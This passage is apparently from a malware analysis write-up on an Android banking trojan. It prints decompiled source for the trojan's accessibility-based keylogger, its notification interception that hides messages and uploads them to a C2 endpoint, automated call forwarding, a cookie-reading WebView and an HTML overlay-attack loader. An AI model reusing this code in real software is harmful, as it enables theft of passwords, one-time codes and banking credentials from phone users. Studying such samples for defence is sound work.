        <span class="k">this</span><span class="p">.</span><span class="n">webView</span><span class="p">.</span><span class="nf">getSettings</span><span class="p">().</span><span class="nf">setJavaScriptEnabled</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="n">webView</span><span class="p">.</span><span class="nf">getSettings</span><span class="p">().</span><span class="nf">setAllowFileAccess</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="n">webView</span><span class="p">.</span><span class="nf">getSettings</span><span class="p">().</span><span class="nf">setSaveFormData</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="n">webView</span><span class="p">.</span><span class="nf">getSettings</span><span class="p">().</span><span class="nf">setAppCacheEnabled</span><span class="p">(</span><span class="k">false</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="n">webView</span><span class="p">.</span><span class="nf">getSettings</span><span class="p">().</span><span class="nf">setCacheMode</span><span class="p">(</span><span class="m">2</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="n">webView</span><span class="p">.</span><span class="nf">setBackgroundColor</span><span class="p">(</span><span class="m">0</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="n">webView</span><span class="p">.</span><span class="nf">setWebViewClient</span><span class="p">(</span><span class="n">cookiesReaderViewerActivityInterfaceImpl</span><span class="err">$</span><span class="m">10</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">@Override</span>  <span class="c1">// com.sdktools.android.core.injects_core.IScreen</span>
    <span class="k">public</span> <span class="k">void</span> <span class="nf">onCreate</span><span class="p">(</span><span class="n">Activity</span> <span class="n">activity0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">FrameLayout</span> <span class="n">frameLayout0</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">FrameLayout</span><span class="p">(</span><span class="n">activity0</span><span class="p">);</span>
        <span class="n">frameLayout0</span><span class="p">.</span><span class="nf">setBackgroundColor</span><span class="p">(-</span><span class="m">1</span><span class="p">);</span>
        <span class="n">WebView</span> <span class="n">webView0</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">WebView</span><span class="p">(</span><span class="n">activity0</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="n">webView</span> <span class="p">=</span> <span class="n">webView0</span><span class="p">;</span>
        <span class="n">frameLayout0</span><span class="p">.</span><span class="nf">addView</span><span class="p">(</span><span class="n">webView0</span><span class="p">,</span> <span class="k">new</span> <span class="n">FrameLayout</span><span class="p">.</span><span class="nf">LayoutParams</span><span class="p">(-</span><span class="m">1</span><span class="p">,</span> <span class="p">-</span><span class="m">1</span><span class="p">));</span>
        <span class="n">activity0</span><span class="p">.</span><span class="nf">setContentView</span><span class="p">(</span><span class="n">frameLayout0</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="nf">init</span><span class="p">();</span>
        <span class="k">this</span><span class="p">.</span><span class="nf">handleData</span><span class="p">(</span><span class="n">activity0</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">@Override</span>  <span class="c1">// com.sdktools.android.core.injects_core.IScreen</span>
    <span class="k">public</span> <span class="k">void</span> <span class="nf">onPause</span><span class="p">(</span><span class="n">Activity</span> <span class="n">activity0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">InjectComponent</span><span class="p">.</span><span class="n">viewerActivityVisible</span> <span class="p">=</span> <span class="k">false</span><span class="p">;</span>
        <span class="n">LifeCycleListener</span> <span class="n">cookiesReaderViewerActivityInterfaceImpl</span><span class="err">$</span><span class="n">LifeCycleListener0</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="n">lifeCycleListener</span><span class="p">;</span>
        <span class="k">if</span><span class="p">(</span><span class="n">cookiesReaderViewerActivityInterfaceImpl</span><span class="err">$</span><span class="n">LifeCycleListener0</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">cookiesReaderViewerActivityInterfaceImpl</span><span class="err">$</span><span class="n">LifeCycleListener0</span><span class="p">.</span><span class="nf">onPause</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="n">@Override</span>  <span class="c1">// com.sdktools.android.core.injects_core.IScreen</span>
    <span class="k">public</span> <span class="k">void</span> <span class="nf">onResume</span><span class="p">(</span><span class="n">Activity</span> <span class="n">activity0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">InjectComponent</span><span class="p">.</span><span class="n">viewerActivityVisible</span> <span class="p">=</span> <span class="k">true</span><span class="p">;</span>
        <span class="n">LifeCycleListener</span> <span class="n">cookiesReaderViewerActivityInterfaceImpl</span><span class="err">$</span><span class="n">LifeCycleListener0</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="n">lifeCycleListener</span><span class="p">;</span>
        <span class="k">if</span><span class="p">(</span><span class="n">cookiesReaderViewerActivityInterfaceImpl</span><span class="err">$</span><span class="n">LifeCycleListener0</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">cookiesReaderViewerActivityInterfaceImpl</span><span class="err">$</span><span class="n">LifeCycleListener0</span><span class="p">.</span><span class="nf">onResume</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="n">@Override</span>  <span class="c1">// com.sdktools.android.core.injects_core.IScreen</span>
    <span class="k">public</span> <span class="k">void</span> <span class="nf">onStop</span><span class="p">(</span><span class="n">Activity</span> <span class="n">activity0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">super</span><span class="p">.</span><span class="nf">onStop</span><span class="p">(</span><span class="n">activity0</span><span class="p">);</span>
        <span class="n">activity0</span><span class="p">.</span><span class="nf">finish</span><span class="p">();</span>
    <span class="p">}</span>

</code></pre></div></div>

<h1 id="keylogger">Keylogger</h1>

<p>The malware has the ability to keylog what the user enters such as <code class="language-plaintext highlighter-rouge">password</code> or any <code class="language-plaintext highlighter-rouge">edittext</code> contains a <code class="language-plaintext highlighter-rouge">hint</code>. Then send keylogging to the C2 server.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">if</span><span class="p">(</span><span class="n">accessibilityEvent0</span><span class="p">.</span><span class="nf">isPassword</span><span class="p">())</span> <span class="p">{</span>
                <span class="k">if</span><span class="p">(!</span><span class="n">s1</span><span class="p">.</span><span class="nf">contains</span><span class="p">(</span><span class="s">"•"</span><span class="p">)</span> <span class="p">&amp;&amp;</span> <span class="p">!</span><span class="n">s1</span><span class="p">.</span><span class="nf">contains</span><span class="p">(</span><span class="s">"*"</span><span class="p">))</span> <span class="p">{</span>
                    <span class="n">keyLoggerModel0</span><span class="p">.</span><span class="nf">setText</span><span class="p">(</span><span class="n">s1</span><span class="p">);</span>
                    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="k">if</span><span class="p">(</span><span class="n">s1</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="n">accessibilityEvent0</span><span class="p">.</span><span class="nf">getSource</span><span class="p">().</span><span class="nf">getHintText</span><span class="p">()))</span> <span class="p">{</span>
                    <span class="n">keyLoggerModel0</span><span class="p">.</span><span class="nf">setText</span><span class="p">(</span><span class="s">""</span><span class="p">);</span>
                    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="kt">int</span> <span class="n">v</span> <span class="p">=</span> <span class="n">keyLoggerModel0</span><span class="p">.</span><span class="nf">getText</span><span class="p">().</span><span class="nf">length</span><span class="p">();</span>
                <span class="k">if</span><span class="p">(</span><span class="n">s1</span><span class="p">.</span><span class="nf">length</span><span class="p">()</span> <span class="p">&gt;</span> <span class="n">v</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">keyLoggerModel0</span><span class="p">.</span><span class="nf">addToText</span><span class="p">(</span><span class="n">Character</span><span class="p">.</span><span class="nf">toString</span><span class="p">(((</span><span class="kt">char</span><span class="p">)</span><span class="n">s1</span><span class="p">.</span><span class="nf">charAt</span><span class="p">(</span><span class="n">s1</span><span class="p">.</span><span class="nf">length</span><span class="p">()</span> <span class="p">-</span> <span class="m">1</span><span class="p">))));</span>
                    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="n">keyLoggerModel0</span><span class="p">.</span><span class="nf">removeLastFromText</span><span class="p">();</span>
                <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="n">keyLoggerModel0</span><span class="p">.</span><span class="nf">setText</span><span class="p">(</span><span class="n">s1</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">@Override</span>  <span class="c1">// com.sdktools.android.bot.SdkComponent</span>
    <span class="k">public</span> <span class="k">void</span> <span class="nf">onSyncEvent</span><span class="p">(</span><span class="n">JsonObject</span> <span class="n">jsonObject0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">super</span><span class="p">.</span><span class="nf">onSyncEvent</span><span class="p">(</span><span class="n">jsonObject0</span><span class="p">);</span>
        <span class="n">Boolean</span> <span class="n">boolean0</span> <span class="p">=</span> <span class="n">JsonUtils</span><span class="p">.</span><span class="nf">hasObject</span><span class="p">(</span><span class="n">jsonObject0</span><span class="p">,</span> <span class="s">"enable_keylogger"</span><span class="p">)</span> <span class="p">?</span> <span class="n">Boolean</span><span class="p">.</span><span class="nf">valueOf</span><span class="p">(</span><span class="n">jsonObject0</span><span class="p">.</span><span class="k">get</span><span class="p">(</span><span class="s">"enable_keylogger"</span><span class="p">).</span><span class="nf">getAsBoolean</span><span class="p">())</span> <span class="p">:</span> <span class="k">null</span><span class="p">;</span>
        <span class="k">if</span><span class="p">(</span><span class="n">boolean0</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">SharedPrefHelper</span><span class="p">.</span><span class="nf">setIsKeyLoggerEnabled</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">context</span><span class="p">(),</span> <span class="n">boolean0</span><span class="p">.</span><span class="nf">booleanValue</span><span class="p">());</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">void</span> <span class="nf">onWindowStateChanged</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">candidateToPass</span><span class="p">.</span><span class="nf">size</span><span class="p">()</span> <span class="p">&gt;</span> <span class="m">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">this</span><span class="p">.</span><span class="n">isRequestInProgress</span><span class="p">.</span><span class="k">set</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
            <span class="n">Log</span><span class="p">.</span><span class="nf">d</span><span class="p">(</span><span class="s">"!!!!!"</span><span class="p">,</span> <span class="s">" SEND DATA TO SERVER "</span> <span class="p">+</span> <span class="k">this</span><span class="p">.</span><span class="n">candidateToPass</span><span class="p">);</span>
            <span class="n">KeyLoggerModel</span> <span class="n">keyLoggerModel0</span> <span class="p">=</span> <span class="p">(</span><span class="n">KeyLoggerModel</span><span class="p">)</span><span class="k">this</span><span class="p">.</span><span class="n">candidateToPass</span><span class="p">.</span><span class="k">get</span><span class="p">(</span><span class="m">0</span><span class="p">);</span>
            <span class="n">HashMap</span> <span class="n">hashMap0</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">HashMap</span><span class="p">();</span>
            <span class="n">hashMap0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"messages"</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="n">candidateToPass</span><span class="p">);</span>
            <span class="k">this</span><span class="p">.</span><span class="nf">api</span><span class="p">().</span><span class="nf">makePost</span><span class="p">(</span><span class="s">"device/kl"</span><span class="p">,</span> <span class="n">hashMap0</span><span class="p">).</span><span class="nf">enqueue</span><span class="p">(</span><span class="k">new</span> <span class="nf">RestCallback</span><span class="p">()</span> <span class="p">{</span>
                <span class="n">@Override</span>  <span class="c1">// com.sdktools.android.bot.rest.RestCallback</span>
                <span class="k">public</span> <span class="k">void</span> <span class="nf">onError</span><span class="p">(</span><span class="n">Throwable</span> <span class="n">throwable0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">KeyLoggerComponent</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">isRequestInProgress</span><span class="p">.</span><span class="k">set</span><span class="p">(</span><span class="k">false</span><span class="p">);</span>
                <span class="p">}</span>

                <span class="n">@Override</span>  <span class="c1">// com.sdktools.android.bot.rest.RestCallback</span>
                <span class="k">public</span> <span class="k">void</span> <span class="nf">onSuccess</span><span class="p">(</span><span class="n">RestResponse</span> <span class="n">restResponse0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">KeyLoggerComponent</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">candidateToPass</span><span class="p">.</span><span class="nf">clear</span><span class="p">();</span>
                    <span class="n">KeyLoggerComponent</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">isRequestInProgress</span><span class="p">.</span><span class="k">set</span><span class="p">(</span><span class="k">false</span><span class="p">);</span>
                <span class="p">}</span>
            <span class="p">});</span>
        <span class="p">}</span>
    <span class="p">}</span>

</code></pre></div></div>

<h1 id="classic-features">Classic Features</h1>

<h2 id="notification-intercepting">Notification intercepting</h2>

<p>The malware will try to intercept notification using <code class="language-plaintext highlighter-rouge">onNotificationPosted</code> callback located in <code class="language-plaintext highlighter-rouge">com.sdktools.android.bot.components.commands</code>. The malware will intercept the comming notifications and  hide them from the user. Then push/upload the content of the notification to the C2 server.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">public</span> <span class="k">void</span> <span class="nf">onNotificationPosted</span><span class="p">(</span><span class="n">StatusBarNotification</span> <span class="n">statusBarNotification0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">Log</span><span class="p">.</span><span class="nf">i</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">TAG</span><span class="p">,</span> <span class="s">"**********  onNotificationPosted"</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">SharedPrefHelper</span><span class="p">.</span><span class="nf">getIsHiddenPushEnabled</span><span class="p">(</span><span class="k">this</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">this</span><span class="p">.</span><span class="nf">cancelNotification</span><span class="p">(</span><span class="n">statusBarNotification0</span><span class="p">.</span><span class="nf">getKey</span><span class="p">());</span>
        <span class="p">}</span>

        <span class="n">Notification</span> <span class="n">notification0</span> <span class="p">=</span> <span class="n">statusBarNotification0</span><span class="p">.</span><span class="nf">getNotification</span><span class="p">();</span>
        <span class="n">String</span> <span class="n">s</span> <span class="p">=</span> <span class="n">notification0</span><span class="p">.</span><span class="n">extras</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="s">"android.title"</span><span class="p">);</span>
        <span class="n">String</span> <span class="n">s1</span> <span class="p">=</span> <span class="n">notification0</span><span class="p">.</span><span class="n">extras</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="s">"android.text"</span><span class="p">);</span>
        <span class="n">Timber</span><span class="p">.</span><span class="nf">d</span><span class="p">(</span><span class="s">"!!!!!"</span><span class="p">,</span> <span class="k">new</span> <span class="n">Object</span><span class="p">[]{</span><span class="s">"title - "</span> <span class="p">+</span> <span class="n">s</span> <span class="p">+</span> <span class="s">" | description - "</span> <span class="p">+</span> <span class="n">s1</span> <span class="p">+</span> <span class="s">" | app - "</span> <span class="p">+</span> <span class="n">statusBarNotification0</span><span class="p">.</span><span class="nf">getPackageName</span><span class="p">()});</span>
        <span class="n">String</span> <span class="n">s2</span> <span class="p">=</span> <span class="s">"Title - "</span> <span class="p">+</span> <span class="n">s</span> <span class="p">+</span> <span class="s">"\nDescription - "</span> <span class="p">+</span> <span class="n">s1</span><span class="p">;</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="k">this</span><span class="p">.</span><span class="nf">sendNotification</span><span class="p">(</span><span class="n">statusBarNotification0</span><span class="p">.</span><span class="nf">getPackageName</span><span class="p">(),</span> <span class="n">s2</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">catch</span><span class="p">(</span><span class="n">Exception</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">Timber</span><span class="p">.</span><span class="nf">d</span><span class="p">(</span><span class="s">"!!!!!"</span><span class="p">,</span> <span class="k">new</span> <span class="n">Object</span><span class="p">[]{</span><span class="s">"cancel notification. Hidden"</span><span class="p">});</span>
    <span class="p">}</span>

    <span class="n">@Override</span>  <span class="c1">// android.service.notification.NotificationListenerService</span>
    <span class="k">public</span> <span class="k">void</span> <span class="nf">onNotificationRemoved</span><span class="p">(</span><span class="n">StatusBarNotification</span> <span class="n">statusBarNotification0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">Timber</span><span class="p">.</span><span class="nf">d</span><span class="p">(</span><span class="s">"!!!!!"</span><span class="p">,</span> <span class="k">new</span> <span class="n">Object</span><span class="p">[]{</span><span class="s">"********** onNOtificationRemoved"</span><span class="p">});</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">void</span> <span class="nf">sendNotification</span><span class="p">(</span><span class="n">String</span> <span class="n">s</span><span class="p">,</span> <span class="n">String</span> <span class="n">s1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">HashMap</span> <span class="n">hashMap0</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">HashMap</span><span class="p">();</span>
        <span class="n">hashMap0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"appId"</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
        <span class="n">hashMap0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"text"</span><span class="p">,</span> <span class="n">s1</span><span class="p">);</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="n">LockerComponent</span><span class="p">.</span><span class="k">get</span><span class="p">()</span> <span class="p">!=</span> <span class="k">null</span> <span class="p">&amp;&amp;</span> <span class="n">LockerComponent</span><span class="p">.</span><span class="k">get</span><span class="p">().</span><span class="nf">api</span><span class="p">()</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">LockerComponent</span><span class="p">.</span><span class="k">get</span><span class="p">().</span><span class="nf">api</span><span class="p">().</span><span class="nf">makePost</span><span class="p">(</span><span class="s">"device/push"</span><span class="p">,</span> <span class="n">hashMap0</span><span class="p">).</span><span class="nf">enqueue</span><span class="p">(</span><span class="k">new</span> <span class="nf">RestCallback</span><span class="p">()</span> <span class="p">{</span>
                    <span class="n">@Override</span>  <span class="c1">// com.sdktools.android.bot.rest.RestCallback</span>
                    <span class="k">public</span> <span class="k">void</span> <span class="nf">onError</span><span class="p">(</span><span class="n">Throwable</span> <span class="n">throwable0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="p">}</span>

                    <span class="n">@Override</span>  <span class="c1">// com.sdktools.android.bot.rest.RestCallback</span>
                    <span class="k">public</span> <span class="k">void</span> <span class="nf">onSuccess</span><span class="p">(</span><span class="n">RestResponse</span> <span class="n">restResponse0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="p">}</span>
                <span class="p">});</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">catch</span><span class="p">(</span><span class="n">Exception</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
        <span class="p">}</span>
    <span class="p">}</span>

</code></pre></div></div>

<h2 id="call-forwarding">Call Forwarding</h2>

<p>The malware can intercept calls and forward calls when the user get a phone call.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
    <span class="k">public</span> <span class="n">boolean</span> <span class="nf">onAccessibilityEvent</span><span class="p">(</span><span class="n">InjAccessibilityService</span> <span class="n">injAccessibilityService0</span><span class="p">,</span> <span class="n">AccessibilityEvent</span> <span class="n">accessibilityEvent0</span><span class="p">,</span> <span class="n">String</span> <span class="n">s</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span>
        <span class="n">Log</span><span class="p">.</span><span class="nf">d</span><span class="p">(</span><span class="s">"OwnAccessibilityService"</span><span class="p">,</span> <span class="s">"onAccessibilityEvent -&gt; "</span> <span class="p">+</span> <span class="n">accessibilityEvent0</span><span class="p">);</span>
        <span class="n">Boolean</span> <span class="n">boolean0</span> <span class="p">=</span> <span class="n">Boolean</span><span class="p">.</span><span class="nf">valueOf</span><span class="p">(</span><span class="k">false</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">accessibilityEvent0</span><span class="p">.</span><span class="nf">getEventType</span><span class="p">()</span> <span class="p">!=</span> <span class="m">0x20</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span><span class="p">(</span><span class="n">accessibilityEvent0</span><span class="p">.</span><span class="nf">getClassName</span><span class="p">().</span><span class="k">equals</span><span class="p">(</span><span class="s">"com.android.phone.settings.SimPickerPreference"</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="n">accessibilityEvent0</span><span class="p">.</span><span class="nf">getSource</span><span class="p">()</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="k">this</span><span class="p">.</span><span class="n">isSecondSimActive</span> <span class="p">=</span> <span class="k">true</span><span class="p">;</span>
            <span class="n">AccessibilityNodeInfo</span> <span class="n">accessibilityNodeInfo0</span> <span class="p">=</span> <span class="n">injAccessibilityService0</span><span class="p">.</span><span class="nf">findAndGetFirstSimilar</span><span class="p">(</span><span class="n">accessibilityEvent0</span><span class="p">.</span><span class="nf">getSource</span><span class="p">(),</span> <span class="s">"com.android.phone:id/recycler_view"</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">currentSim</span> <span class="p">==</span> <span class="n">SimCard</span><span class="p">.</span><span class="n">Sim1</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">injAccessibilityService0</span><span class="p">.</span><span class="nf">performClick</span><span class="p">(</span><span class="n">accessibilityNodeInfo0</span><span class="p">.</span><span class="nf">getChild</span><span class="p">(</span><span class="m">0</span><span class="p">),</span> <span class="s">"f"</span><span class="p">);</span>
                <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="k">if</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">currentSim</span> <span class="p">==</span> <span class="n">SimCard</span><span class="p">.</span><span class="n">Sim2</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">injAccessibilityService0</span><span class="p">.</span><span class="nf">performClick</span><span class="p">(</span><span class="n">accessibilityNodeInfo0</span><span class="p">.</span><span class="nf">getChild</span><span class="p">(</span><span class="m">1</span><span class="p">),</span> <span class="s">"f"</span><span class="p">);</span>
                <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">accessibilityEvent0</span><span class="p">.</span><span class="nf">getClassName</span><span class="p">().</span><span class="k">equals</span><span class="p">(</span><span class="s">"com.android.phone.settings.GsmUmtsCallForwardOptions"</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="n">accessibilityEvent0</span><span class="p">.</span><span class="nf">getSource</span><span class="p">()</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">this</span><span class="p">.</span><span class="nf">tryToClickXiaomiCallForwardingButton</span><span class="p">(</span><span class="n">injAccessibilityService0</span><span class="p">,</span> <span class="n">accessibilityEvent0</span><span class="p">);</span>
                <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="kt">int</span> <span class="n">v</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
            <span class="k">while</span><span class="p">(</span><span class="n">v</span> <span class="p">&lt;=</span> <span class="m">40</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span><span class="p">(</span><span class="n">v</span> <span class="p">%</span> <span class="m">5</span> <span class="p">==</span> <span class="m">0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">injAccessibilityService0</span><span class="p">.</span><span class="nf">performClick</span><span class="p">(</span><span class="n">injAccessibilityService0</span><span class="p">.</span><span class="nf">getRootInActiveWindow</span><span class="p">(),</span> <span class="s">""</span><span class="p">);</span>
                <span class="p">}</span>

                <span class="k">try</span> <span class="p">{</span>
                    <span class="n">Thread</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="m">1000L</span><span class="p">);</span>
                    <span class="k">if</span><span class="p">(</span><span class="n">injAccessibilityService0</span><span class="p">.</span><span class="nf">getRootInActiveWindow</span><span class="p">()</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
                        <span class="n">injAccessibilityService0</span><span class="p">.</span><span class="nf">getRootInActiveWindow</span><span class="p">().</span><span class="nf">refresh</span><span class="p">();</span>
                    <span class="p">}</span>

                    <span class="n">boolean</span> <span class="n">z</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="nf">tryToClickXiaomiCallForwardingButton</span><span class="p">(</span><span class="n">injAccessibilityService0</span><span class="p">,</span> <span class="n">accessibilityEvent0</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="k">catch</span><span class="p">(</span><span class="n">InterruptedException</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">return</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="k">if</span><span class="p">(</span><span class="n">z</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="p">++</span><span class="n">v</span><span class="p">;</span>
                <span class="k">continue</span><span class="p">;</span>
                <span class="k">this</span><span class="p">.</span><span class="nf">tryToClickXiaomiCallForwardingButton</span><span class="p">(</span><span class="n">injAccessibilityService0</span><span class="p">,</span> <span class="n">accessibilityEvent0</span><span class="p">);</span>
                <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
</code></pre></div></div>

<h2 id="overlay-attack">Overlay attack</h2>

<p>As we see the malware will download a <code class="language-plaintext highlighter-rouge">zip</code> file contains <code class="language-plaintext highlighter-rouge">html</code> files of the targeted apps. If a targeted APP is opened then the malware will launch the <code class="language-plaintext highlighter-rouge">html</code> file of the targeted app. Located in <code class="language-plaintext highlighter-rouge">com.sdktools.android.bot.components.injects.system</code>.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">class</span> <span class="nc">ViewerActivityInterfaceImpl</span> <span class="n">extends</span> <span class="n">IScreen</span> <span class="p">{</span>
    <span class="k">public</span> <span class="k">interface</span> <span class="nc">LifeCycleListener</span> <span class="p">{</span>
        <span class="n">boolean</span> <span class="nf">onPause</span><span class="p">();</span>

        <span class="n">boolean</span> <span class="nf">onResume</span><span class="p">();</span>
    <span class="p">}</span>

 <span class="k">public</span> <span class="nf">ViewerActivityInterfaceImpl</span><span class="p">(</span><span class="n">InjectModel</span> <span class="n">injectModel0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">this</span><span class="p">.</span><span class="n">injectModel</span> <span class="p">=</span> <span class="n">injectModel0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="nf">ViewerActivityInterfaceImpl</span><span class="p">(</span><span class="n">InjectModel</span> <span class="n">injectModel0</span><span class="p">,</span> <span class="n">LifeCycleListener</span> <span class="n">viewerActivityInterfaceImpl</span><span class="err">$</span><span class="n">LifeCycleListener0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">this</span><span class="p">.</span><span class="n">injectModel</span> <span class="p">=</span> <span class="n">injectModel0</span><span class="p">;</span>
        <span class="k">this</span><span class="p">.</span><span class="n">lifeCycleListener</span> <span class="p">=</span> <span class="n">viewerActivityInterfaceImpl</span><span class="err">$</span><span class="n">LifeCycleListener0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">void</span> <span class="nf">handleData</span><span class="p">(</span><span class="n">Activity</span> <span class="n">activity0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="k">this</span><span class="p">.</span><span class="n">webView</span><span class="p">.</span><span class="nf">clearView</span><span class="p">();</span>
            <span class="n">String</span> <span class="n">s</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="n">injectModel</span><span class="p">.</span><span class="nf">getInjectPath</span><span class="p">();</span>
            <span class="n">s</span> <span class="p">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">startsWith</span><span class="p">(</span><span class="s">"http"</span><span class="p">)</span> <span class="p">?</span> <span class="k">this</span><span class="p">.</span><span class="n">injectModel</span><span class="p">.</span><span class="nf">getInjectPath</span><span class="p">()</span> <span class="p">:</span> <span class="s">"file:///"</span> <span class="p">+</span> <span class="n">s</span><span class="p">;</span>
            <span class="k">this</span><span class="p">.</span><span class="n">webView</span><span class="p">.</span><span class="nf">loadUrl</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
